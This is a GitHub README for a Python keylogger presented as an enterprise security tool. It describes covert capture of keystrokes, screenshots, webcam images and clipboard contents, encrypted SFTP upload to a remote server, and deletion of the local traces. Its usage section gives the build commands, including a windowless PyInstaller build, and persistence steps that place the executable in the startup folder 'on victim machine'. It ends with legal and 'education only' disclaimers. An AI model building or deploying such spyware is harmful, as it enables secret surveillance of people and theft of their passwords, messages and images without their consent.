# Keylogger-for-Enterprise-Security

```
 _____              ______                     _ 
/  ___|             | ___ \                   | |
\ `--. _ __  _   _  | |_/ / ___   __ _ _ __ __| |
 `--. \ '_ \| | | | | ___ \/ _ \ / _` | '__/ _` |
/\__/ / |_) | |_| | | |_/ / (_) | (_| | | | (_| |
\____/| .__/ \__, | \____/ \___/ \__,_|_|  \__,_|
      | |     __/ |                              
      |_|    |___/                              
```
     
```   
# Python Keylogger with Sftp Features

## Features
1) Sftp files to Secure server.
2) Encrypt files.
3) Delete files after transfer.
4) Categorise Files recived.
5) Capture screenshot.
6) Capture Webcam shot.
7) Copy Clipboard. 
8) Persistence can be setup by moving the executable to the startup folder using (shell:startup)
```
## Intended For
`Windows 10` 

## Requirements
```
(latest versions)
-Python 3.9
-pip
-Pillow 9.1.1
-Opencv-python 4.5.5.64
-pysftp 0.2.9
-pywin32 304
-cryptography 37.0.2
-pynput 1.7.6
-pyinstaller 5.1
```
## Usage
```
#Clone or download the project
git clone https://github.com/hamadalifaizer/Keylogger-for-Enterprise-Security.git

#install Requirements
pip3 install -r reqirements.txt

#change keylog.py variables to fit your criteria
#change number of seconds you want each iteration or each time the program will sftp to the server

#compile keylog.py
pyinstaller -F -w keylog.py

#To add to startup open run (WIN + r) shell:startup on victim machine, add keylog.exe to the folder.

```
## How it works
When you launch the executable it creates a new folder in C:/Users/Public called log Files where all the files will be stored. on one iteration keystrokes will be recorded and one screenshot will be taken and one Webcam shot will be taken. once all features are finished the program will then proceed to read the keylog text document where if any of the keywords are found it will sftp to the threat folder in the server if no keywords are found it will be sent to the log folder in the server. once the files have been transferred the files stored locally will be deleted. 

## Demonstration video
```
Demonstration Video link:
https://ecu.ap.panopto.com/Panopto/Pages/Viewer.aspx?id=8c8ddb6c-e741-4b25-bf42-ae9801545606

```
## Note
Sometimes you may need to add runtime hooks on pyinstaller because some libraries will not be added to the executable. alternatively you may use pyarmor to create the executable however I have not tried this. 

## Disclaimer
Installing computer monitoring tools on computers you do not own or do not have permission to monitor may violate local, state or federal law. 
Logging other people's keystrokes or breaking into other people's computer without their permission can be considered illegal by the courts of many countries. 

### THIS SOFTWARE IS INTENDED ONLY FOR EDUCATION PURPOSES. DO NOT USE IT TO INFLICT DAMAGE TO ANYONE. USING THIS APPLICATION YOU AUTOMATICALLY AGREE WITH ALL THE RULES AND TAKE RESPONSIBILITY FOR YOUR ACTION. THE VIOLATION OF LAWS CAN CAUSE SERIOUS CONSEQUENCES. THE DEVELOPER [hamadalifaizer]([https://www.example.com](https://github.com/hamadalifaizer)) ASSUMES NO LIABILITY AND IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.

